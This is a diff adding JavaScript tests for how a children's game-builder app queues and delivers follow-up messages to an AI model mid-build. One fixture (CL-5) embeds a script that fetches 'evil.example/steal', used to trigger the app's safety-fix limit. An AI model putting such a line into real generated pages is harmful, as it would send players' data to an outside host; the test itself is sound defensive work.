@@ -459,3 +459,166 @@ test('CL-12 no model identifiers in code comments (code values like config defau
   assert.ok(files.length > 50);
   assert.deepEqual(bad, []);
 });
+
+// ---- Follow-ups: messages the builder sends while the AI works (runner.js), placed after the tool results.
+const fuUser = name => auth.createUser({ username: name, password: 'secret1' });
+const fuOf = gameId => loadChat(gameId).messages.filter(m => m.followUp);
+async function until(fn, ms = 4000) { const t0 = Date.now(); while (!fn()) { if (Date.now() - t0 > ms) throw new Error('timed out'); await new Promise(r => setTimeout(r, 5)); } }
+/** Run a build whose emit adds follow-up text the first time at(name, d) is true. -> { r, events, calls } */
+async function fuTurn(u, g, text, rounds, at, fu = 'make it a dragon') {
+  script.push(...rounds);
+  const before = streamed().length; const events = []; let added = false;
+  const r = await runTurn({ user: u, gameId: g.id, text, emit: (n, d) => {
+    events.push([n, d]);
+    if (!added && at(n, d)) { added = true; runner._acceptScreened(g.id, auth.getUser(u.id), fu); }
+  } });
+  assert.equal(script.length, 0, 'every scripted round was used');
+  return { r, events, calls: streamed().slice(before) };
+}
+const WRITE = { type: 'tool_use', name: 'write_game', input: { notes: 'A fox', html: GAME } };
+const EDIT = { type: 'tool_use', name: 'edit_game', input: { notes: 'A dragon now', edits: [{ find: 'speed: 1', replace: 'speed: 2' }] } };
+
+test('CL-1 a follow-up sent while the AI writes is read next round: its own words, after the tool results, never inside them', async () => {
+  const u = fuUser('FuKid1'); const g = games.createGame(u.id, {});
+  const { events, calls } = await fuTurn(u, g, 'a fox game', [[WRITE], [EDIT], [{ type: 'text', text: 'Done!' }]], (n, d) => n === 'step' && d.key === 'write');
+  assert.equal(calls.length, 3);
+  const last = calls[1].body.messages.at(-1);
+  assert.equal(last.role, 'user');
+  assert.deepEqual(last.content.map(b => b.type), ['tool_result', 'text']);
+  assert.deepEqual(last.content[1], { type: 'text', text: 'make it a dragon' });
+  assert.doesNotMatch(JSON.stringify(last.content[0]), /dragon/);
+  const rows = rowsOf(events);
+  assert.deepEqual(rows.find(x => x.key === 'think' && x.n === 2), { key: 'think', n: 2, c: 'msg', m: 1, a: 1 });
+  const reading = idx(events, 'inbox', d => d.status === 'reading'), read = idx(events, 'inbox', d => d.status === 'read');
+  assert.equal(events[reading][1].n, 2);
+  assert.ok(reading < idx(events, 'step', d => d.key === 'think' && d.n === 2), 'handed over, then the round starts');
+  assert.ok(read > idx(events, 'step', d => d.key === 'edit'), 'read once the answer is complete');
+  assert.ok(read < idx(events, 'version', d => d.number === 2), 'and before its tools run');
+  assert.deepEqual(fuOf(g.id).map(m => [m.status, m.by]), [['read', 'ai']]);
+  assert.equal(events.find(e => e[0] === 'done')[1].steps.fu, 1);
+});
+
+test('CL-2 a reply with no tools goes on when a message is waiting', async () => {
+  const u = fuUser('FuKid2'); const g = games.createGame(u.id, {});
+  const { calls } = await fuTurn(u, g, 'hello', [[{ type: 'text', text: 'Hi! What game shall we make?' }], [{ type: 'text', text: 'A cat game, yes!' }]], n => n === 'text', 'a cat game');
+  assert.equal(calls.length, 2);
+  const msgs = calls[1].body.messages;
+  assert.equal(msgs.at(-2).role, 'assistant');
+  assert.deepEqual(msgs.at(-1), { role: 'user', content: [{ type: 'text', text: 'a cat game' }] });
+});
+
+test('CL-3 after ask_user the loop goes on when the answer may be here: the ask_user result, then the message', async () => {
+  const u = fuUser('FuKid3'); const g = games.createGame(u.id, {});
+  const ASK = { type: 'tool_use', name: 'ask_user', input: { question: 'What kind of game?', options: ['🧺 Catch', '🏃 Runner', '❓ Quiz'] } };
+  const { calls, events } = await fuTurn(u, g, 'hello', [[ASK], [{ type: 'text', text: 'A catch game it is!' }]], n => n === 'ask', 'a catch game');
+  assert.equal(calls.length, 2);
+  const last = calls[1].body.messages.at(-1);
+  assert.deepEqual(last.content.map(b => b.type), ['tool_result', 'text']);
+  assert.equal(last.content[0].tool_use_id, calls[1].body.messages.at(-2).content[0].id);
+  assert.equal(last.content[1].text, 'a catch game');
+  assert.equal(events.filter(e => e[0] === 'ask').length, 1);
+});
+
+test('CL-4 the rounds run out with a message waiting: the next build starts by itself (1 turn) with only that message', async () => {
+  const u = fuUser('FuKid4'); const g = games.createGame(u.id, {});
+  const NOTES = [{ type: 'tool_use', name: 'test_notes', input: { checklist: ['Hop over a log'] } }];
+  const { events, calls } = await fuTurn(u, g, 'a fox game', [...Array.from({ length: 14 }, () => NOTES), [{ type: 'text', text: 'Sure, a dragon!' }]],
+    (n, d) => n === 'step' && d.key === 'think' && d.n === 14);
+  assert.equal(calls.length, 15);
+  const first2 = calls[14].body.messages.at(-1);
+  assert.deepEqual(first2, { role: 'user', content: [{ type: 'text', text: 'make it a dragon' }] });
+  assert.doesNotMatch(JSON.stringify(calls[14].body.messages), /something for inspiration/);
+  assert.deepEqual(events.filter(e => e[0] === 'inbox').map(e => e[1].status), ['waiting', 'carried', 'reading', 'read']);
+  assert.equal(rowsOf(events.slice(idx(events, 'inbox', d => d.status === 'carried'))).find(x => x.key === 'think').c, 'msg');
+  assert.equal(q.get('SELECT turns FROM builder_usage WHERE user_id=?', u.id).turns, 2);
+});
+
+test('CL-5 the safety-fix limit with a message waiting: it carries on into the next build', async () => {
+  const u = fuUser('FuKid5'); const g = games.createGame(u.id, {});
+  const BAD = '<title>x</title><style>b{}</style><canvas></canvas><script>fetch("https://evil.example/steal")</script>';
+  let fixes = 0;
+  const { events } = await fuTurn(u, g, 'a fox game', [...[1, 2, 3].map(k => [{ type: 'tool_use', name: 'write_game', input: { notes: `Try ${k}`, html: BAD } }]), [{ type: 'text', text: 'Okay, a dragon!' }]],
+    (n, d) => n === 'step' && d.key === 'fix' && ++fixes === 2);
+  assert.deepEqual(events.filter(e => e[0] === 'inbox').map(e => e[1].status), ['waiting', 'carried', 'reading', 'read']);
+  assert.equal(q.get('SELECT turns FROM builder_usage WHERE user_id=?', u.id).turns, 2);
+});
+
+test('CL-6 an error with a message waiting: dropped (error), no more requests', async () => {
+  const u = fuUser('FuKid6'); const g = games.createGame(u.id, {});
+  const { events, calls } = await fuTurn(u, g, 'a fox game', ['error400'], (n, d) => n === 'step' && d.key === 'think');
+  assert.equal(calls.length, 1);
+  assert.deepEqual(events.filter(e => e[0] === 'inbox').map(e => e[1]).at(-1), { status: 'dropped', ids: [fuOf(g.id)[0].id], why: 'error' });
+  assert.deepEqual([fuOf(g.id)[0].status, fuOf(g.id)[0].why], ['dropped', 'error']);
+});
+
+test('CL-7 a refused follow-up never reaches the model', async () => {
+  const u = fuUser('FuKid7'); const g = games.createGame(u.id, {});
+  script.push({ hold: 600, blocks: [{ type: 'text', text: 'Building your fox. ' }, WRITE] }, [{ type: 'text', text: 'Done!' }]);
+  let sent = null;
+  const before = streamed().length;
+  await runTurn({ user: u, gameId: g.id, text: 'a fox game', emit: n => { if (n === 'text' && !sent) sent = runner.submit({ user: auth.getUser(u.id), game: games.getGame(g.id), text: 'a castle with a dragon', t: tEn }); } });
+  const res = await sent;
+  await until(() => !runner.isBusy(g.id));
+  assert.ok(res.body.refused || res.status === 202, JSON.stringify(res.body));
+  assert.doesNotMatch(JSON.stringify(streamed().slice(before).map(x => x.body)), /castle/);
+  script.length = 0;
+});
+
+test('CL-8 the request stays as it was: same keys, the follow-ups section in the system prompt, and messages only ever appended', async () => {
+  const u = fuUser('FuKid8'); const g = games.createGame(u.id, {});
+  assert.match(SYSTEM_PROMPT, /# New messages while you work/);
+  const { calls } = await fuTurn(u, g, 'a fox game', [[WRITE], [EDIT], [{ type: 'text', text: 'Done!' }]], (n, d) => n === 'step' && d.key === 'write');
+  const keys = calls.map(c => Object.keys(c.body).sort().join());
+  assert.equal(new Set(keys).size, 1, keys.join(' | '));
+  for (const c of calls) { assert.equal(c.body.temperature, undefined); assert.equal(c.body.thinking, undefined); assert.equal(c.body.system[0].text, SYSTEM_PROMPT); }
+  for (let k = 1; k < calls.length; k++) assert.deepEqual(calls[k].body.messages.slice(0, calls[k - 1].body.messages.length), calls[k - 1].body.messages, `request ${k + 1} only appends`);
+});
+
+test('CL-9 the next build\'s history has the follow-up where it was sent, with user and assistant in turns', async () => {
+  const u = fuUser('FuKid9'); const g = games.createGame(u.id, {});
+  await fuTurn(u, g, 'a fox game', [[{ type: 'text', text: 'Building! ' }, WRITE], [{ type: 'text', text: 'Dragon done!' }]], (n, d) => n === 'version' && d.number === 1);
+  script.push([{ type: 'text', text: 'You are welcome!' }]);
+  await runTurn({ user: u, gameId: g.id, text: 'thanks', emit: () => {} });
+  const msgs = streamed().at(-1).body.messages;
+  const roles = msgs.map(m => m.role);
+  assert.ok(roles.every((r, k) => !k || r !== roles[k - 1]), roles.join());
+  const flat = msgs.map(m => (typeof m.content === 'string' ? m.content : m.content.map(b => b.text || '').join(' ')));
+  const at = flat.findIndex(s => s.includes('make it a dragon'));
+  assert.ok(at > 0 && msgs[at].role === 'user');
+  assert.match(flat[at - 1], /Built version 1/, 'after what the AI had built when it was sent');
+  assert.match(flat[at + 1], /Dragon done!/);
+});
+
+test('CL-14 "read" only when the model answered: a failed round drops it (put back); a restart hands it to the resumed attempt', async () => {
+  const u = fuUser('FuKid14'); const g = games.createGame(u.id, {});
+  const { events } = await fuTurn(u, g, 'a fox game', [[WRITE], 'error400'], (n, d) => n === 'step' && d.key === 'write');
+  const st = events.filter(e => e[0] === 'inbox').map(e => e[1].status);
+  assert.deepEqual(st, ['waiting', 'reading', 'dropped']);
+  assert.deepEqual([fuOf(g.id)[0].status, fuOf(g.id)[0].why], ['dropped', 'error']);
+  script.push([{ type: 'text', text: 'Okay!' }]);
+  await runTurn({ user: u, gameId: g.id, text: 'thanks', emit: () => {} });
+  assert.doesNotMatch(JSON.stringify(streamed().at(-1).body.messages), /make it a dragon/);
+
+  // A restart while the round that carries it is still streaming: the resumed attempt reads it in its round 1.
+  const g2 = games.createGame(u.id, {});
+  script.push([WRITE], { hold: 3000, blocks: [{ type: 'text', text: 'Ooh, a dragon!' }] }, [{ type: 'text', text: 'Carrying on with the dragon!' }]);
+  let added = false;
+  const r = await runTurn({ user: u, gameId: g2.id, text: 'a fox game', emit: (n, d) => {
+    if (n === 'step' && d.key === 'write' && !added) { added = true; runner._acceptScreened(g2.id, auth.getUser(u.id), 'make it a dragon'); }
+    if (n === 'inbox' && d.status === 'reading') setTimeout(() => runner.handOff(), 100);
+  } });
+  assert.equal(r.error, 'restart');
+  assert.equal(fuOf(g2.id)[0].status, 'reading', 'handed over but never answered');
+  const ev = [];
+  runner.attach(g2.id, { userId: u.id, locale: 'en', compat: false, send: (n, d) => ev.push([n, d]), close() {} });
+  assert.equal(runner.recover().resumed, 1);
+  const job = runner.jobFor(g2.id);
+  await runner.idle(job);
+  const first = streamed().at(-1).body.messages.at(-1);
+  assert.ok(first.content.some(b => b.type === 'text' && b.text === 'make it a dragon'), 'the resumed attempt\'s first request carries it');
+  const reading = idx(ev, 'inbox', d => d.status === 'reading'), read = idx(ev, 'inbox', d => d.status === 'read');
+  assert.ok(reading >= 0 && read > reading); assert.equal(ev[reading][1].n, 1);
+  assert.ok(read > idx(ev, 'text', d => /Carrying on/.test(d.text)), 'read only after the answer streamed');
+  assert.deepEqual([fuOf(g2.id)[0].status, fuOf(g2.id)[0].readTurn], ['read', job.id]);
+  assert.equal(script.length, 0);
+});
